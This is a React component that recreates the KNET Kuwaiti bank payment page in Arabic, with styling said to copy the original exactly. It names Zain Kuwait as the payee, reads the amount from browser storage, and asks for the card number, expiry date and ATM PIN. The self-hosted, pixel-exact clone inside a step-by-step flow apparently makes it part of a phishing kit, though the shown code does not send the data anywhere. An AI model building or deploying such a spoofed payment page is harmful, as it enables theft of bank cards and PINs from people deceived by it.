import { useEffect, useMemo, useRef, useState } from "react"

import {
  findBestKnetBankMatch,
  findMatchingKnetBankBins,
  hasResolvedKnetBankPrefix,
  type KnetBankBin,
} from "../lib/knet-banks"

function normalizeDigits(v: string) { return v.replace(/\D/g, "") }

function formatCardNumberEditable(v: string) {
  const d = normalizeDigits(v).slice(0, 16)
  return d.replace(/(\d{4})(?=\d)/g, "$1 ").trim()
}

function formatCardNumberMasked(v: string) {
  const d = normalizeDigits(v).slice(0, 16)
  if (d.length <= 10) return formatCardNumberEditable(d)
  const maskedMiddle = "•".repeat(Math.max(0, d.length - 10))
  return `${d.slice(0, 6)}${maskedMiddle}${d.slice(-4)}`
    .replace(/(.{4})(?=.)/g, "$1 ")
    .trim()
}

/* ─── Inline styles that mirror the original CSS exactly ─── */
const css = `
  .knet-body {
    background: linear-gradient(180deg, #f8f8fb 0%, #f0f0f3 42%, #ececef 100%);
    color: #5f636b;
    font-family: "Tahoma","Segoe UI",sans-serif;
    min-height: 100vh;
    margin: 0;
  }
  .knet-shell {
    width: min(100%, 690px);
    margin: 0 auto;
    min-height: 100vh;
    background: #f1f1f4;
    --knet-banner-width: 86.4%;
    --knet-panel-width: 91.2%;
  }
  .knet-topbar {
    position: relative;
    display: flex;
    align-items: center;
    justify-content: center;
    min-height: 104px;
    padding: 24px 28px 18px;
    border-bottom: 1px solid #e2e3e7;
    background: rgba(248,248,251,0.92);
  }
  .knet-topbar h1 {
    margin: 0;
    color: #0e1116;
    font-size: 1.08rem;
    font-weight: 700;
  }
  .knet-back {
    position: absolute;
    top: 26px;
    inset-inline-start: 28px;
    width: 58px;
    height: 58px;
    border: 1px solid #e0e2e6;
    background: rgba(255,255,255,0.52);
    box-shadow: 0 1px 0 rgba(255,255,255,0.6);
    display: grid;
    place-items: center;
    cursor: pointer;
    border-radius: 0;
  }
  .knet-back-arrow {
    width: 15px;
    height: 15px;
    border-top: 2px solid #4f545a;
    border-left: 2px solid #4f545a;
    transform: rotate(-45deg);
    margin-left: 6px;
  }
  .knet-screen {
    padding: 14px 0 32px;
  }
  .knet-banner {
    width: var(--knet-banner-width);
    margin: 0 auto 18px;
    overflow: hidden;
    border-radius: 14px;
    box-shadow: 0 10px 18px rgba(28,35,45,0.12);
    background: #fff;
  }
  .knet-banner-hero {
    aspect-ratio: 864 / 210;
  }
  .knet-banner img {
    display: block;
    width: 100%;
    height: 100%;
    object-fit: cover;
  }
  .knet-panel {
    width: var(--knet-panel-width);
    margin: 0 auto;
    background: #fff;
    border: 1px solid #9fa3a8;
    border-radius: 26px;
    box-shadow: 0 12px 24px rgba(43,50,61,0.16);
  }
  .knet-summary-panel {
    margin-bottom: 18px;
    padding: 22px 24px;
    min-height: 120px;
    display: flex;
    align-items: center;
  }
  .knet-summary-grid {
    width: 100%;
    display: flex;
    justify-content: space-between;
    align-items: flex-end;
    gap: 24px;
    direction: rtl;
  }
  .knet-summary-block {
    display: flex;
    flex-direction: column;
    gap: 6px;
  }
  .knet-summary-block-recipient {
    text-align: right;
  }
  .knet-summary-block-amount {
    text-align: left;
  }
  .knet-summary-label {
    color: #8a8d93;
    font-size: 0.82rem;
  }
  .knet-summary-value {
    color: #20232c;
    font-size: 1.1rem;
    font-weight: 700;
  }
  .knet-form-panel {
    padding: 22px 24px 20px;
    margin-bottom: 26px;
  }
  .knet-form-row {
    display: flex;
    align-items: center;
    justify-content: space-between;
    gap: 22px;
    direction: rtl;
    min-height: 55px;
  }
  .knet-form-row + .knet-form-row {
    margin-top: 14px;
    padding-top: 14px;
    border-top: 1px solid #a8adb3;
  }
  .knet-field-wrap {
    flex: 0 0 54%;
    max-width: 54%;
    min-width: 0;
    position: relative;
  }
  .knet-field-wrap-expiry {
    flex: 0 0 18%;
    max-width: 18%;
  }
  .knet-field {
    width: 100%;
    height: 55px;
    border: 1px solid #c8cfd6;
    border-radius: 12px;
    background: linear-gradient(180deg,#ffffff 0%,#f9fafb 100%);
    box-shadow:
      inset 0 4px 9px rgba(119,132,146,0.22),
      inset 0 1px 0 rgba(255,255,255,0.96),
      0 1px 0 rgba(255,255,255,0.9);
    outline: none;
    padding: 0 14px;
    color: #6d7278;
    font-size: 1.02rem;
    font-weight: 500;
    text-align: left;
    transition: border-color 0.16s,box-shadow 0.16s;
    box-sizing: border-box;
    font-family: inherit;
  }
  .knet-field:focus {
    border-color: #bcc3cb;
    box-shadow:
      inset 0 4px 9px rgba(119,132,146,0.22),
      inset 0 1px 0 rgba(255,255,255,0.96),
      0 0 0 2px rgba(43,126,194,0.1);
  }
  .knet-field::placeholder {
    color: #b7bcc3;
    font-weight: 600;
  }
  .knet-field-expiry {
    text-align: center;
    color: #8f9197;
    font-weight: 700;
    letter-spacing: 0.04em;
  }
  .knet-field-pin { letter-spacing: 3px; }
  .knet-field-has-bank { padding-right: 96px !important; }
  .knet-field-label {
    flex: 0 0 31%;
    max-width: 31%;
    min-width: 0;
    color: #2b7ec2;
    font-size: 0.95rem;
    font-weight: 700;
    line-height: 1.25;
    text-align: right;
    direction: rtl;
    white-space: nowrap;
  }
  .knet-selected-bank {
    position: absolute;
    top: 50%;
    right: 12px;
    transform: translateY(-50%);
    width: auto;
    max-width: 84px;
    display: flex;
    align-items: center;
    justify-content: flex-end;
    pointer-events: none;
  }
  .knet-selected-bank img {
    display: block;
    width: auto;
    max-width: 84px;
    max-height: 30px;
    object-fit: contain;
    object-position: right center;
  }
  .knet-selected-bank-badge {
    display: inline-flex;
    align-items: center;
    justify-content: center;
    min-width: 54px;
    height: 24px;
    border-radius: 4px;
    border: 1px solid #d1d7de;
    background: linear-gradient(180deg,#ffffff 0%,#edf1f5 100%);
    box-shadow: inset 0 1px 0 rgba(255,255,255,0.92);
    color: #5f636b;
    font-size: 0.74rem;
    font-weight: 800;
    letter-spacing: 0.03em;
    text-transform: uppercase;
  }
  .knet-dropdown {
    position: absolute;
    inset-inline: 0;
    top: calc(100% + 8px);
    border: 1px solid #d2d6db;
    border-radius: 18px;
    background: linear-gradient(180deg,#fff 0%,#f7f7f8 100%);
    box-shadow: 0 14px 26px rgba(33,41,53,0.2);
    overflow: hidden;
    z-index: 20;
    max-height: 248px;
    overflow-y: auto;
  }
  .knet-option {
    width: 100%;
    border: 0;
    background: transparent;
    display: flex;
    align-items: center;
    justify-content: space-between;
    gap: 12px;
    padding: 12px 16px;
    cursor: pointer;
    direction: ltr;
    text-align: left;
    font-family: inherit;
  }
  .knet-option:hover, .knet-option.knet-active { background: rgba(43,126,194,0.08); }
  .knet-option + .knet-option { border-top: 1px solid rgba(0,0,0,0.04); }
  .knet-option-label { color: #73767d; font-size: 0.95rem; white-space: nowrap; }
  .knet-option-logo { width: 84px; flex: 0 0 auto; display: flex; justify-content: flex-end; align-items: center; }
  .knet-option-logo img {
    display: block;
    width: auto;
    max-width: 84px;
    max-height: 28px;
    object-fit: contain;
    object-position: right center;
  }
  .knet-empty { padding: 14px 16px; text-align: center; color: #888b91; font-size: 0.9rem; }
  .knet-actions-panel {
    display: grid;
    grid-template-columns: 1fr 1fr;
    gap: clamp(12px, 4vw, 40px);
    padding: 18px 12px;
    margin-bottom: 24px;
  }
  .knet-action-btn {
    height: 75px;
    border: 1px solid #cfd2d6;
    border-radius: 14px;
    background: linear-gradient(180deg,#f5f5f6 0%,#e8e8e9 100%);
    color: #6d7076;
    font-size: 1.08rem;
    font-weight: 700;
    cursor: pointer;
    font-family: inherit;
  }
  .knet-action-btn:hover { background: linear-gradient(180deg,#eee 0%,#e0e0e1 100%); }
  .knet-footer {
    text-align: center;
    line-height: 1.7;
    padding-bottom: 30px;
    direction: rtl;
  }
  .knet-footer p { margin: 0; color: #16191f; font-size: 0.92rem; }
  .knet-footer p + p { color: #2b7ec2; font-weight: 700; }

  @media (max-width: 560px) {
    .knet-screen { padding: 12px 0 28px; }
    .knet-back { inset-inline-start: 18px; }
    .knet-summary-panel {
      padding: 18px 20px;
      min-height: 112px;
    }
    .knet-summary-grid {
      gap: 16px;
    }
    .knet-form-panel { padding: 20px 18px 18px; }
    .knet-form-row { gap: 14px; }
    .knet-field-label {
      flex-basis: 33%;
      max-width: 33%;
      font-size: 0.86rem;
    }
    .knet-field-wrap { flex-basis: 56%; max-width: 56%; }
    .knet-field-wrap-expiry { flex: 0 0 24%; max-width: 24%; }
    .knet-field {
      height: 52px;
      font-size: 0.97rem;
    }
    .knet-field-has-bank { padding-right: 82px !important; }
    .knet-selected-bank {
      max-width: 72px;
      right: 8px;
    }
    .knet-selected-bank img {
      max-width: 72px;
      max-height: 28px;
    }
    .knet-actions-panel { padding: 16px 10px; gap: 12px; }
    .knet-action-btn { height: 66px; font-size: 1rem; }
  }
`

interface Props {
  setStepNumber?: (n: number) => void
}

export default function PaymentForm({ setStepNumber }: Props) {
  const [cardDigits, setCardDigits] = useState("")
  const [expiry, setExpiry] = useState("")
  const [pin, setPin] = useState("")
  const [dropdownOpen, setDropdownOpen] = useState(false)
  const [activeIndex, setActiveIndex] = useState(-1)
  const [isCardFocused, setIsCardFocused] = useState(false)
  const [showBankLogo, setShowBankLogo] = useState(true)
  const [amount] = useState(() => localStorage.getItem("amount") || "6.000")
  const wrapRef = useRef<HTMLDivElement>(null)
  const inputRef = useRef<HTMLInputElement>(null)

  const digits = normalizeDigits(cardDigits)
  const cardNumber = isCardFocused ? formatCardNumberEditable(digits) : formatCardNumberMasked(digits)

  const selectedAccount = useMemo(() => findBestKnetBankMatch(digits), [digits])

  const results = useMemo(() => findMatchingKnetBankBins(digits), [digits])

  useEffect(() => {
    setShowBankLogo(Boolean(selectedAccount?.logo))
  }, [selectedAccount?.logo])

  /* close dropdown on outside click */
  useEffect(() => {
    const handler = (e: MouseEvent) => {
      if (wrapRef.current && !wrapRef.current.contains(e.target as Node)) {
        setDropdownOpen(false)
      }
    }
    document.addEventListener("mousedown", handler)
    return () => document.removeEventListener("mousedown", handler)
  }, [])

  function handleCardInput(e: React.ChangeEvent<HTMLInputElement>) {
    const nextDigits = normalizeDigits(e.target.value).slice(0, 16)
    setCardDigits(nextDigits)
    setActiveIndex(-1)
    setDropdownOpen(nextDigits.length > 0 && nextDigits.length < 9 && !hasResolvedKnetBankPrefix(nextDigits))
  }

  function handleCardKeyDown(e: React.KeyboardEvent) {
    if (!dropdownOpen || !results.length) {
      if (e.key === "Escape") setDropdownOpen(false)
      return
    }
    if (e.key === "ArrowDown") { e.preventDefault(); setActiveIndex((i) => (i + 1) % results.length) }
    if (e.key === "ArrowUp")   { e.preventDefault(); setActiveIndex((i) => (i - 1 + results.length) % results.length) }
    if (e.key === "Enter" && activeIndex >= 0) { e.preventDefault(); selectAccount(results[activeIndex]) }
    if (e.key === "Escape") setDropdownOpen(false)
  }

  function selectAccount(item: KnetBankBin) {
    setCardDigits(item.bin)
    setDropdownOpen(false)
    setActiveIndex(-1)
    requestAnimationFrame(() => inputRef.current?.focus())
  }

  function handleExpiryInput(e: React.ChangeEvent<HTMLInputElement>) {
    const d = normalizeDigits(e.target.value).slice(0, 4)
    setExpiry(d.length > 2 ? `${d.slice(0, 2)} / ${d.slice(2)}` : d)
  }

  function handlePinInput(e: React.ChangeEvent<HTMLInputElement>) {
    setPin(normalizeDigits(e.target.value).slice(0, 4))
  }

  return (
    <>
      <style dangerouslySetInnerHTML={{ __html: css }} />
      <div className="knet-body" dir="rtl">
        <div className="knet-shell">

          {/* Top bar */}
          <header className="knet-topbar">
            <button
              className="knet-back"
              type="button"
              aria-label="رجوع"
              onClick={() => setStepNumber?.(2)}
            >
              <span className="knet-back-arrow" />
            </button>
            <h1>عمليات الدفع</h1>
          </header>

          <section className="knet-screen">

            {/* Fraud warning banner */}
            <figure className="knet-banner knet-banner-hero">
              <img src="/knet-banner.jpg" alt="تنبيه توعوي عن الاحتيال المصرفي" />
            </figure>

            {/* Summary card — dynamic amount */}
            <section className="knet-panel knet-summary-panel">
              <div className="knet-summary-grid">
                <div className="knet-summary-block knet-summary-block-recipient">
                  <div className="knet-summary-label">المستفيد:</div>
                  <div className="knet-summary-value">Zain Kuwait</div>
                </div>
                <div className="knet-summary-block knet-summary-block-amount">
                  <div className="knet-summary-label">المبلغ:</div>
                  <div className="knet-summary-value">KD {amount}</div>
                </div>
              </div>
            </section>

            {/* Form panel */}
            <section className="knet-panel knet-form-panel">

              {/* Card number row */}
              <div className="knet-form-row">
                <label className="knet-field-label" htmlFor="knet-cardNumber">رقم بطاقة الصراف الآلي:</label>
                <div className="knet-field-wrap" ref={wrapRef}>
                  <input
                    ref={inputRef}
                    id="knet-cardNumber"
                    className={`knet-field${selectedAccount ? " knet-field-has-bank" : ""}`}
                    type="text"
                    inputMode="numeric"
                    autoComplete="off"
                    aria-label="رقم بطاقة الصراف الآلي"
                    value={cardNumber}
                    onChange={handleCardInput}
                    onFocus={() => {
                      setIsCardFocused(true)
                      if (digits && digits.length < 9 && !hasResolvedKnetBankPrefix(digits)) {
                        setDropdownOpen(true)
                      }
                    }}
                    onBlur={() => setIsCardFocused(false)}
                    onKeyDown={handleCardKeyDown}
                  />

                  {/* Selected bank logo */}
                  {selectedAccount && (
                    <div className="knet-selected-bank" aria-live="polite">
                      {showBankLogo && selectedAccount.logo ? (
                        <img
                          src={selectedAccount.logo}
                          alt=""
                          onError={() => setShowBankLogo(false)}
                        />
                      ) : (
                        <span className="knet-selected-bank-badge">{selectedAccount.initials}</span>
                      )}
                    </div>
                  )}

                  {/* Dropdown */}
                  {dropdownOpen && (
                    <div className="knet-dropdown">
                      {results.length === 0
                        ? <div className="knet-empty">لا توجد نتائج</div>
                        : results.map((item, idx) => (
                          <button
                            key={item.bin}
                            type="button"
                            className={`knet-option${idx === activeIndex ? " knet-active" : ""}`}
                            onMouseDown={(e) => e.preventDefault()}
                            onClick={() => selectAccount(item)}
                          >
                            <span className="knet-option-label">{item.bin} - {item.displayName}</span>
                            <span className="knet-option-logo">
                              {item.logo ? (
                                <img src={item.logo} alt={item.displayName} />
                              ) : (
                                <span className="knet-selected-bank-badge">{item.initials}</span>
                              )}
                            </span>
                          </button>
                        ))
                      }
                    </div>
                  )}
                </div>
              </div>

              {/* Expiry row */}
              <div className="knet-form-row">
                <label className="knet-field-label" htmlFor="knet-expiry">تاريخ انتهاء البطاقة:</label>
                <div className="knet-field-wrap knet-field-wrap-expiry">
                  <input
                    id="knet-expiry"
                    className="knet-field knet-field-expiry"
                    type="text"
                    inputMode="numeric"
                    autoComplete="off"
                    placeholder="YY / MM"
                    aria-label="تاريخ انتهاء البطاقة"
                    value={expiry}
                    onChange={handleExpiryInput}
                  />
                </div>
              </div>

              {/* PIN row */}
              <div className="knet-form-row">
                <label className="knet-field-label" htmlFor="knet-pin">الرقم السري (PIN):</label>
                <div className="knet-field-wrap">
                  <input
                    id="knet-pin"
                    className="knet-field knet-field-pin"
                    type="password"
                    inputMode="numeric"
                    autoComplete="off"
                    maxLength={4}
                    aria-label="الرقم السري"
                    value={pin}
                    onChange={handlePinInput}
                  />
                </div>
              </div>
            </section>

            {/* Action buttons */}
            <section className="knet-panel knet-actions-panel">
              <button className="knet-action-btn" type="button">إرسال</button>
              <button className="knet-action-btn" type="button" onClick={() => setStepNumber?.(2)}>إلغاء</button>
            </section>

            {/* Footer */}
            <footer className="knet-footer">
              <p>جميع الحقوق محفوظة © 2026</p>
              <p>شركة الخدمات المصرفية الآلية المشتركة - كي نت</p>
            </footer>

          </section>
        </div>
      </div>
    </>
  )
}
